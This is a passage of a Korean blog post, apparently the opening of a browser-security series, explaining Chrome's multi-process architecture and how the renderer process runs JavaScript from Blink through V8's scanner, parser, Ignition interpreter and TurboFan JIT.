&#xD574;&#xC11D;&#xD558;&#xC5EC;, &#xC6B0;&#xB9AC;&#xAC00; &#xB208;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xB294; &#xC2DC;&#xAC01;&#xC801; &#xACB0;&#xACFC;&#xBB3C;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>GPU Process</strong></p><p>  2D/3D &#xADF8;&#xB798;&#xD53D; &#xCC98;&#xB9AC;&#xB098; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAC00;&#xC18D;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC791;&#xC5C5;&#xC744; &#xC804;&#xB2F4;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Utility / Network / Extension Process &#xB4F1;</strong></p><p>  &#xAC01;&#xAC01; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD1B5;&#xC2E0;, &#xBA40;&#xD2F0;&#xBBF8;&#xB514;&#xC5B4; &#xCC98;&#xB9AC;, &#xD655;&#xC7A5; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xAC19;&#xC740; &#xBCC4;&#xB3C4;&#xC758; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><p>&#xC774;&#xCC98;&#xB7FC; &#xAC01; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB3C5;&#xB9BD;&#xC801;&#xC73C;&#xB85C; &#xC5ED;&#xD560;&#xC744; &#xBD84;&#xB2F4;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xC6B0;&#xB9AC;&#xB294; &#xBA40;&#xD2F0; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; &#xD06C;&#xB86C;&#xC774; &#xC5EC;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xC788;&#xB294; &#xAC00;&#xC7A5; &#xD070; &#xC774;&#xC720;&#xB294; &#xBC14;&#xB85C; <strong>&#xBCF4;&#xC548;</strong>&#xACFC; <strong>&#xC548;&#xC815;&#xC131;</strong> &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC11C;&#xB85C; <strong>&#xACA9;&#xB9AC;</strong>&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C;, &#xC124;&#xB839; &#xD558;&#xB098;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC804;&#xCCB4; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xAC00; &#xBA39;&#xD1B5;&#xC774; &#xB418;&#xB294; &#xB300;&#xCC38;&#xC0AC;&#xB97C; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8; &#xB54C;&#xBB38;&#xC5D0; Renderer Process&#xAC00; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC885;&#xB8CC;&#xB418;&#xB354;&#xB77C;&#xB3C4;, Browser Process&#xB294; &#xC5EC;&#xC804;&#xD788; &#xC0B4;&#xC544;&#xB0A8;&#xC544; &#x201C;&#xC774; &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xC751;&#xB2F5;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;&#x201D; &#xAC19;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xC804;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p><img src="image%203.png" alt="image.png"></p><p>&#xBC14;&#xB85C; &#xC774; <strong>&#xACA9;&#xB9AC;</strong> &#xAC1C;&#xB150;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD55C; <strong>Sandbox &#xBCF4;&#xC548; &#xBAA8;&#xB378;</strong>&#xC774; &#xD06C;&#xB86C; &#xBCF4;&#xC548;&#xC758; &#xD575;&#xC2EC; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. (Sandbox&#xB294; &#xB2E4;&#xC74C; &#xD3B8;&#xC5D0;&#xC11C; &#xB354; &#xC790;&#xC138;&#xD788; &#xB2E4;&#xB8E8;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!)</p><h3 id="1-2-&#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC;-&#xB9AC;&#xC18C;&#xC2A4;-&#xCC98;&#xB9AC;-&#xACFC;&#xC815;-in-Chrome"><a href="#1-2-&#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC;-&#xB9AC;&#xC18C;&#xC2A4;-&#xCC98;&#xB9AC;-&#xACFC;&#xC815;-in-Chrome" class="headerlink" title="1.2 &#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC; &#xB9AC;&#xC18C;&#xC2A4; &#xCC98;&#xB9AC; &#xACFC;&#xC815; in Chrome"></a>1.2 &#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC; &#xB9AC;&#xC18C;&#xC2A4; &#xCC98;&#xB9AC; &#xACFC;&#xC815; in Chrome</h3><p><img src="image%204.png" alt="image.png"></p><p>Chrome &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB294; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xB2E4;&#xC591;&#xD55C; <strong>&#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC; &#xB9AC;&#xC18C;&#xC2A4;</strong>, &#xC608;&#xB97C; &#xB4E4;&#xC5B4; HTML, CSS, JavaScript &#xD30C;&#xC77C;&#xC744; &#xBC1B;&#xC544;&#xC640; &#xC774;&#xB97C; &#xB80C;&#xB354;&#xB9C1;&#xD569;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xAC00; &#xD0ED; &#xD558;&#xB098;&#xB97C; &#xC5F4;&#xACE0; &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xB294; &#xADF8; &#xC9E7;&#xC740; &#xC21C;&#xAC04;&#xC5D0;&#xB3C4; &#xC704;&#xC5D0;&#xC11C; &#xBCF4;&#xC168;&#xB2E4;&#xC2DC;&#xD53C; &#xBA40;&#xD2F0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xAF64; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800;, &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB294; &#xC11C;&#xBC84;&#xB85C;&#xBD80;&#xD130; <strong>HTML &#xBB38;&#xC11C;</strong>&#xB97C; &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xBC1B;&#xC544;&#xC624;&#xACE0; &#xC774;&#xB97C; &#xD30C;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>&lt;link&gt;</code>&#xB098; <code>&lt;script&gt;</code> &#xD0DC;&#xADF8; &#xB4F1;&#xC744; &#xB9CC;&#xB098;&#xAC8C; &#xB418;&#xBA74;, &#xADF8;&#xC5D0; &#xB530;&#xB77C; &#xC678;&#xBD80; <strong>CSS &#xD30C;&#xC77C;</strong>&#xACFC; <strong>JavaScript &#xD30C;&#xC77C;</strong>&#xB3C4; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xC694;&#xCCAD;&#xD558;&#xACE0; &#xBD88;&#xB7EC;&#xC624;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xBC1B;&#xC544;&#xC628; &#xB9AC;&#xC18C;&#xC2A4;&#xB4E4;&#xC740; &#xAC01;&#xC790; &#xC5ED;&#xD560;&#xC774; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;. <strong>HTML</strong>&#xC740; &#xD398;&#xC774;&#xC9C0;&#xC758; &#xAE30;&#xBCF8; &#xAD6C;&#xC870;&#xB97C; &#xC815;&#xC758;&#xD558;&#xB294; &#xBF08;&#xB300; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xACE0;, <strong>CSS</strong>&#xB294; &#xADF8; &#xBF08;&#xB300;&#xC5D0; &#xC0C9;&#xACFC; &#xD615;&#xD0DC;&#xB97C; &#xC785;&#xD788;&#xB294; &#xC2A4;&#xD0C0;&#xC77C; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xB2F9;&#xD558;&#xC8E0;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <strong>JavaScript</strong>&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC640;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9;, &#xC774;&#xBCA4;&#xD2B8; &#xCC98;&#xB9AC;, &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158; &#xB4F1; <strong>&#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC0DD;&#xBA85;&#xB825;&#xC744; &#xBD88;&#xC5B4;&#xB123;&#xB294; &#xB3D9;&#xC791; &#xB85C;&#xC9C1;</strong>&#xC744; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD2B9;&#xD788; JavaScript&#xB294; &#xB2E4;&#xB978; &#xC5B8;&#xC5B4;&#xB4E4;&#xACFC; &#xB2EC;&#xB9AC; <strong>&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD0C0;&#xC785;&#xC774; &#xBC14;&#xB00C;&#xACE0;</strong>, &#xC2E4;&#xD589; &#xC911;&#xC5D0; <strong>&#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAC70;&#xB098; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xC720;&#xC5F0;&#xD55C; &#xD2B9;&#xC131;</strong>&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC5B4;&#xC694;. &#xC774;&#xB7F0; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xC6F9; &#xAC1C;&#xBC1C;&#xC774; &#xD6E8;&#xC52C; &#xC720;&#xC5F0;&#xD574;&#xC9C0;&#xC9C0;&#xB9CC;, &#xBC18;&#xB300;&#xB85C; &#xC774;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xB0B4;&#xBD80;&#xC758; &#xC2E4;&#xD589; &#xD658;&#xACBD;&#xC740; &#xD6E8;&#xC52C; &#xB354; &#xBCF5;&#xC7A1;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p><img src="image%205.png" alt="image.png"></p><p>&#xADF8;&#xB798;&#xC11C; &#xB4F1;&#xC7A5;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBC14;&#xB85C; <strong>V8 JavaScript &#xC5D4;&#xC9C4;</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xD06C;&#xB86C; &#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xB294; &#xC774; V8 &#xC5D4;&#xC9C4;&#xC744; &#xC0AC;&#xC6A9;&#xD574; JavaScript &#xCF54;&#xB4DC;&#xB97C; &#xBE60;&#xB974;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xBA70;, &#xADF8; &#xBAA8;&#xB4E0; &#xACFC;&#xC815;&#xC740; &#xB80C;&#xB354;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB77C;&#xB294; &#xB3C5;&#xB9BD;&#xC801;&#xC778; &#xACF5;&#xAC04; &#xC548;&#xC5D0;&#xC11C; &#xC774;&#xB904;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB80C;&#xB354;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xB7EC; &#xAC00;&#xC2DC;&#xC8E0;!</p><h2 id="2-About-Render-Process"><a href="#2-About-Render-Process" class="headerlink" title="2. About Render Process"></a>2. About Render Process</h2><p>&#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC2E4;&#xC81C;&#xB85C; &#x201C;&#xBCF4;&#xC5EC;&#xC8FC;&#xACE0; &#xB3D9;&#xC791;&#xD558;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294;&#x201D; &#xBAA8;&#xB4E0; &#xCC98;&#xB9AC;&#xB294; &#xBC14;&#xB85C; &#xC774; <strong>&#xB80C;&#xB354;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;</strong>&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xC758; &#xD0ED;&#xC740; &#xD558;&#xB098;&#xC758; &#xB80C;&#xB354;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB2F4;&#xB2F9;&#xD558;&#xBA70;, &#xC774; &#xC548;&#xC5D0;&#xC11C; HTML &#xD30C;&#xC2F1;&#xACFC; CSS &#xC801;&#xC6A9;, DOM &#xAD6C;&#xC131;, JavaScript &#xC2E4;&#xD589;, &#xB808;&#xC774;&#xC544;&#xC6C3; &#xACC4;&#xC0B0;, &#xD398;&#xC778;&#xD305;, &#xCEF4;&#xD3EC;&#xC9C0;&#xD305;&#xAE4C;&#xC9C0; &#xC804;&#xCCB4; &#xB80C;&#xB354;&#xB9C1; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC774; &#xC9C4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image%206.png" alt="image.png"></p><p>JavaScript&#xB294; &#xC2E4;&#xD589; &#xC911;&#xC5D0; &#xD0C0;&#xC785;&#xC774; &#xBC14;&#xB00C;&#xAC70;&#xB098; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xAC00; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xD560; &#xC218; &#xC788;&#xB294; &#xC544;&#xC8FC; &#xC720;&#xC5F0;&#xD55C; &#xC5B8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB7F0; &#xC720;&#xC5F0;&#xC131;&#xC740; &#xACE7;, &#xBA54;&#xBAA8;&#xB9AC; &#xBCC0;&#xC870;&#xB098; <strong>Type Confusion</strong> &#xAC19;&#xC740; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC704;&#xD5D8;&#xB3C4; &#xD568;&#xAED8; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC704;&#xD5D8;&#xC744; &#xC904;&#xC774;&#xAE30; &#xC704;&#xD574;, Chrome&#xC740; <strong>JavaScript&#xB97C; &#xBCC4;&#xB3C4;&#xC758; &#xB80C;&#xB354;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C; &#xACA9;&#xB9AC;</strong>&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xD0ED; &#xD558;&#xB098;&#xC5D0;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xC0DD;&#xACA8;&#xB3C4; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB9CC; &#xC885;&#xB8CC;&#xD558;&#xBA74; &#xB418;&#xACE0;, &#xB2E4;&#xB978; &#xD0ED;&#xC774;&#xB098; &#xBE0C;&#xB77C;&#xC6B0;&#xC800; &#xC804;&#xCCB4;&#xC5D0;&#xB294; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC9C0; &#xC54A;&#xAC8C; &#xC124;&#xACC4;&#xB41C; &#xAC70;&#xC8E0;. &#xC774;&#xC81C; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C;, &#xC774;&#xB7F0; &#xB80C;&#xB354;&#xB7EC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; <strong>JavaScript&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xC9C0;</strong> &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-1-Blink-&#x2192;-V8-&#xD750;&#xB984;"><a href="#2-1-Blink-&#x2192;-V8-&#xD750;&#xB984;" class="headerlink" title="2.1 Blink &#x2192; V8 &#xD750;&#xB984;"></a><strong>2.1 Blink &#x2192; V8 &#xD750;&#xB984;</strong></h3><p>&#xBE0C;&#xB77C;&#xC6B0;&#xC800;&#xC758; &#xB80C;&#xB354;&#xB9C1; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC5D0;&#xC11C; <strong>HTML &#xD30C;&#xC2F1;&#xACFC; &#xD654;&#xBA74; &#xB80C;&#xB354;&#xB9C1;</strong>&#xC740; Blink &#xC5D4;&#xC9C4;&#xC774; &#xB2F4;&#xB2F9;&#xD558;&#xACE0;, <strong>JavaScript &#xCF54;&#xB4DC;&#xC758; &#xC2E4;&#xD589;</strong>&#xC740; V8 &#xC5D4;&#xC9C4;&#xC774; &#xB2F4;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB450; &#xC5D4;&#xC9C4;&#xC740; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xC644;&#xC804;&#xD788; &#xAD6C;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAE34;&#xBC00;&#xD558;&#xAC8C; &#xC5F0;&#xACB0;&#xB418;&#xC5B4; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong>Blink</strong>&#xB294; &#xB80C;&#xB354;&#xB9C1; &#xC5D4;&#xC9C4;&#xC73C;&#xB85C;, HTML&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xACE0; DOM&#xC744; &#xAD6C;&#xC131;&#xD558;&#xBA70;</p><p><strong>V8</strong>&#xC740; JavaScript &#xC2E4;&#xD589;&#xC744; &#xC804;&#xBB38;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xC5D4;&#xC9C4;&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xC774;&#xC81C; Blink&#xC5D0;&#xC11C; V8&#xC73C;&#xB85C; &#xC81C;&#xC5B4; &#xD750;&#xB984;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xB294; &#xACFC;&#xC815;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>&#x2460; <code>&lt;script&gt;</code> &#xD0DC;&#xADF8;&#xB97C; &#xB9CC;&#xB098;&#xBA74;</strong></p><p>Blink&#xB294; HTML&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB358; &#xC911; <code>&lt;script&gt;</code> &#xD0DC;&#xADF8;&#xB97C; &#xB9CC;&#xB098;&#xBA74;, JavaScript &#xD30C;&#xC77C;&#xC744; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC1B;&#xC544;&#xB4E4;&#xC774;&#xAE30; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D;&#xB41C; JS &#xCF54;&#xB4DC;&#xB294; &#xBB38;&#xC790;&#xC5F4; &#xD615;&#xD0DC;&#xB85C; V8 &#xC5D4;&#xC9C4;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xACE0;, &#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; V8&#xC774; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xC774;&#xC5B4;&#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%207.png" alt="image.png"></p><hr><p>&#x2461; <strong>Scanner: &#xBB38;&#xC790;&#xC5F4; &#x2192; &#xD1A0;&#xD070;(Token) &#xBD84;&#xD574;</strong></p><p>V8 &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; Blink&#xB85C;&#xBD80;&#xD130; &#xC804;&#xB2EC;&#xBC1B;&#xC740; <strong>UTF-16 &#xBB38;&#xC790;&#xC5F4; &#xD615;&#xD0DC;&#xC758; JavaScript &#xCF54;&#xB4DC;</strong>&#xB97C; &#xBA3C;&#xC800; &#xC2A4;&#xCE90;&#xB108;&#xAC00; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC2A4;&#xCE90;&#xB108;&#xB294; &#xC774; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; &#xBB38;&#xBC95; &#xADDC;&#xCE59;&#xC5D0; &#xB530;&#xB77C; &#xC758;&#xBBF8; &#xC788;&#xB294; &#xCD5C;&#xC18C; &#xB2E8;&#xC704;&#xC778; &#xD1A0;&#xD070;&#xC73C;&#xB85C; &#xBD84;&#xD574;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>function</code>, <code>if</code>, <code>=</code>, <code>123</code>, <code>&apos;hello&apos;</code> &#xB4F1;&#xC740; &#xBAA8;&#xB450; &#xAC01;&#xAC01;&#xC758; &#xD1A0;&#xD070;&#xC73C;&#xB85C; &#xBD84;&#xB9AC;&#xB418;&#xBA70;, &#xC774;&#xD6C4; &#xAD6C;&#xBB38; &#xBD84;&#xC11D; &#xB2E8;&#xACC4;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image%208.png" alt="image.png"></p><hr><p><strong>&#x2462; Parser: AST &#xC0DD;&#xC131;</strong></p><p>&#xC774;&#xC81C; <strong>Parser</strong>&#xAC00; &#xD1A0;&#xD070;&#xB4E4;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xC11C; AST (&#xCD94;&#xC0C1; &#xAD6C;&#xBB38; &#xD2B8;&#xB9AC;, Abstract Syntax Tree)&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774; &#xD2B8;&#xB9AC;&#xB294; &#xCF54;&#xB4DC;&#xC758; &#xAD6C;&#xC870;&#xC640; &#xC758;&#xBBF8;&#xB97C; &#xD45C;&#xD604;&#xD55C; &#xB098;&#xBB34; &#xAD6C;&#xC870;&#xC758; &#xB370;&#xC774;&#xD130;&#xC778;&#xB370;, &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xC774;&#xB860;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xBBC0;&#xB85C; &#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%209.png" alt="image.png"></p><hr><p><strong>&#x2463; Ignition: Bytecode&#xB85C; &#xBCC0;&#xD658;</strong></p><p>&#xC0DD;&#xC131;&#xB41C; AST&#xB294; V8&#xC758; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xC778; <strong>Ignition</strong>&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. Ignition&#xC740; &#xC774; AST&#xB97C; &#xC21C;&#xD68C;&#xD558;&#xBA70;, JavaScript &#xCF54;&#xB4DC;&#xB97C; V8 &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB294; CPU&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xBA38;&#xC2E0; &#xCF54;&#xB4DC;&#xBCF4;&#xB2E4; &#xD55C; &#xB2E8;&#xACC4; &#xCD94;&#xC0C1;&#xD654;&#xB41C; &#xC911;&#xAC04; &#xD45C;&#xD604;&#xC73C;&#xB85C;, &#xBE60;&#xB978; &#xC2E4;&#xD589;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%2010.png" alt="image.png"></p><hr><p><strong>&#x2464; &#xC2E4;&#xD589;!</strong></p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB294; <strong>Ignition &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;</strong>&#xC5D0; &#xC758;&#xD574; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xAC00; &#xC791;&#xC131;&#xD55C; JavaScript &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xBA70;, &#xC774;&#xBCA4;&#xD2B8; &#xB9AC;&#xC2A4;&#xB108;&#xB97C; &#xB4F1;&#xB85D;&#xD558;&#xAC70;&#xB098;, DOM&#xC744; &#xC218;&#xC815;&#xD558;&#xAC70;&#xB098;, &#xC560;&#xB2C8;&#xBA54;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xB4E4;&#xC774; &#xC218;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. V8&#xC740; &#xC2E4;&#xD589; &#xC911; &#xCF54;&#xB4DC;&#xC758; &#xC2E4;&#xD589; &#xD328;&#xD134;&#xC744; &#xAD00;&#xCC30;&#xD558;&#xC5EC;, &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xB098; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xAC10;&#xC9C0;&#xD558;&#xBA74;, &#xC774;&#xB97C; &#xB354;&#xC6B1; &#xBE60;&#xB974;&#xAC8C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCD5C;&#xC801;&#xD654; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC778; TurboFan&#xC744; &#xB3D9;&#xC791;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB294; &#xAE30;&#xACC4;&#xC5B4; &#xC218;&#xC900;&#xC758; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC;&#xB85C; <strong>JIT(Just-In-Time) &#xCEF4;&#xD30C;&#xC77C;</strong>&#xB418;&#xBA70;, &#xC131;&#xB2A5;&#xC774; &#xD06C;&#xAC8C; &#xD5A5;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xC774;&#xB7EC;&#xD55C; JavaScript &#xC2E4;&#xD589; &#xACFC;&#xC815; &#xB4A4;&#xC5D0; &#xC228;&#xC5B4; &#xC788;&#xB294; <strong>V8 &#xB0B4;&#xBD80; &#xAD6C;&#xC870;</strong>&#xB97C; &#xC870;&#xAE08; &#xB354; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-2-V8-&#xC5D4;&#xC9C4;-&#xC18C;&#xAC1C;"><a 